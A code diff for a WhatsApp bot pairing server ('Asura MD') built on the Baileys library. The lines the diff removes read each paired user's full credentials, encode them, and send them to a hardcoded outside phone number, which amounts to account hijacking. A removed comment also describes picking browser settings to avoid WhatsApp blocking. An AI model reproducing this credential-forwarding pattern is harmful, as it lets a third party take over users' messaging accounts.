@@ -4,17 +4,14 @@ import {
     useMultiFileAuthState, 
     delay, 
     Browsers, 
-    makeCacheableSignalKeyStore, 
-    DisconnectReason 
+    makeCacheableSignalKeyStore 
 } from '@whiskeysockets/baileys';
 import pino from 'pino';
-import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -23,11 +20,12 @@ app.get('/', (req, res) => {
 });
 
 app.get('/pair', async (req, res) => {
-    let phone = req.query.number; 
-    if (!phone) return res.send({ error: "Phone number is required" });
+    let phone = req.query.number;
+    if (!phone) return res.send({ error: "Number required!" });
 
-    const id = Math.random().toString(36).substring(2, 10);
-    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);
+    // ഓരോ യൂസർക്കും പ്രത്യേക സെഷൻ ഫോൾഡർ (ഉദാ: session_91xxx)
+    const sessionName = `session_${phone.replace(/[^0-9]/g, '')}`;
+    const { state, saveCreds } = await useMultiFileAuthState(sessionName);
 
     try {
         const sock = makeWASocket({
@@ -37,68 +35,28 @@ app.get('/pair', async (req, res) => {
             },
             printQRInTerminal: false,
             logger: pino({ level: "silent" }),
-            // വാട്സാപ്പ് ബ്ലോക്ക് ചെയ്യാത്ത ഒറിജിനൽ ബ്രൗസർ സെറ്റിംഗ്സ് 👇
-            browser: Browsers.macOS("Desktop"),
-            syncFullHistory: false
+            browser: ["Ubuntu", "Chrome", "110.0.5481.177"]
         });
 
         if (!sock.authState.creds.registered) {
-            await delay(2500); 
-            phone = phone.replace(/[^0-9]/g, '');
-            
-            const code = await sock.requestPairingCode(phone);
-            
-            if (!res.headersSent) {
-                res.send({ code: code });
-            }
+            await delay(2000);
+            const code = await sock.requestPairingCode(phone.replace(/[^0-9]/g, ''));
+            if (!res.headersSent) res.send({ code: code });
         }
 
         sock.ev.on('creds.update', saveCreds);
-        
+
         sock.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect } = update;
-            
+            const { connection } = update;
             if (connection === 'open') {
-                // "Loading" പ്രശ്നം ഒഴിവാക്കാൻ കൂടുതൽ ഡിലേ നൽകുന്നു
-                await delay(12000); 
-                
-                const credsPath = `./temp_${id}/creds.json`;
-                if (fs.existsSync(credsPath)) {
-                    const authFile = JSON.parse(fs.readFileSync(credsPath));
-                    const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');
-
-                    const myNumber = "917736811908@s.whatsapp.net";
-                    const sessionID = `Asura_MD_${sessionId}`;
-                    
-                    // സെഷൻ ഐഡി അയക്കുന്നു
-                    await sock.sendMessage(myNumber, { text: sessionID });
-                    await sock.sendMessage(myNumber, { 
-                        text: `*👺 ASURA MD SESSION CONNECTED*\n\n✅ *User:* ${phone}\n\n> Don't share this ID!` 
-                    });
-
-                    await delay(5000);
-                    // സെഷൻ എടുത്തു കഴിഞ്ഞാൽ ക്ലീൻ അപ്പ്
-                    try {
-                        sock.end();
-                        fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
-                    } catch (e) {}
-                }
-            }
-
-            if (connection === 'close') {
-                const reason = lastDisconnect?.error?.output?.statusCode;
-                if (reason !== DisconnectReason.loggedOut) {
-                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
-                }
+                console.log(`✅ Connected: ${phone}`);
+                // ഇവിടെ നിങ്ങൾക്ക് ബോട്ടിന്റെ മെയിൻ ഫംഗ്ഷനുകൾ (ഉദാ: .tagall) സ്റ്റാർട്ട് ചെയ്യാം
+                await sock.sendMessage(sock.user.id, { text: "*Asura MD Connected Successfully!* 👺" });
             }
         });
-
     } catch (err) {
-        console.log("Error:", err);
-        if (!res.headersSent) {
-            res.status(500).send({ error: "Try again after some time." });
-        }
+        res.status(500).send({ error: "Server Error" });
     }
 });
 
-app.listen(port, () => console.log(`Asura MD Ultimate Engine on port ${port}`));
+app.listen(port, () => console.log(`Asura MD Web-Pairing on port ${port}`));
